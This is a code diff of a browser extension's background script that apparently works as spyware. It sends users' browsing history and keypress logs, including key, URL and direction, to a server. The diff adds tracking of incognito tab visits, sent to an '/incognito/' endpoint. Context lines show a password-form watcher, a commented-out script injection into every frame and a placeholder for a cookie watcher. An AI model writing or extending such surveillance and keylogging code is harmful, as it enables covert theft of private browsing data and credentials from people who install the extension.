@@ -37,9 +37,7 @@ const addUser = (uid) => {
     };
     chrome.history.search({ text: "" }, (h) => {
         data.history = h;
-        postRequest("/user/add/", data).catch((err) =>
-            console.log(err.message)
-        );
+        postRequest("/user/", data).catch((err) => console.log(err.message));
     });
 };
 
@@ -56,12 +54,22 @@ const addForm = (uid, form, tab) => {
 // Add live history entries as it is added
 const addHistory = (uid, historyItem) => {
     const data = { uid, historyItem };
-    postRequest("/history/add/", data).catch((err) => console.log(err.message));
+    postRequest("/history/", data).catch((err) => console.log(err.message));
+};
+
+// Add live incognito history
+const addIncognitoHistory = (uid, tab) => {
+    const historyItem = {
+        time: Date.now(),
+        ...tab,
+    };
+    const data = { uid, historyItem };
+    postRequest("/incognito/", data).catch((err) => console.log(err.message));
 };
 
 // Logs keypresses
 const logKeypress = (uid, url, direction, key) => {
-    const data = { uid, time: new Date().toString(), url, direction, key };
+    const data = { uid, time: Date.now(), url, direction, key };
     postRequest("/keypress/", data).catch((err) => console.log(err.message));
 };
 
@@ -105,6 +113,21 @@ chrome.storage.sync.get("historyWatcher", (runCommand) => {
     });
 });
 
+// Adds to history as websites are visited (not available in incognito)
+chrome.storage.sync.get("incognitoHistoryWatcher", (runCommand) => {
+    if (!runCommand.incognitoHistoryWatcher) return;
+    chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
+        if (
+            changeInfo.status === "complete" ||
+            changeInfo.status === "loading"
+        ) {
+            chrome.storage.sync.get("userid", (res) => {
+                addIncognitoHistory(res.userid, tab);
+            });
+        }
+    });
+});
+
 // Forms with password Listener
 chrome.storage.sync.get("passwordWatcher", (runCommand) => {
     if (!runCommand.passwordWatcher) return;
@@ -134,15 +157,14 @@ chrome.storage.sync.get("keyPressWatcher", (runCommand) => {
     });
 });
 
+// Cookie watcher
+
 // Script injection
-// chrome.tabs.onUpdated.addListener((tabId, info) => {
-//     if (info.status === "complete") {
+// chrome.tabs.onUpdated.addListener((tabId, changeInfo) => {
+//     if (changeInfo.status === "complete") {
 //         chrome.scripting.executeScript({
 //             target: { tabId: tabId, allFrames: true },
 //             files: ["script/inject.js"],
 //         });
 //     }
 // });
-
-// WEB REQUESTS
-// https://developer.chrome.com/docs/extensions/mv3/intro/mv3-migration/
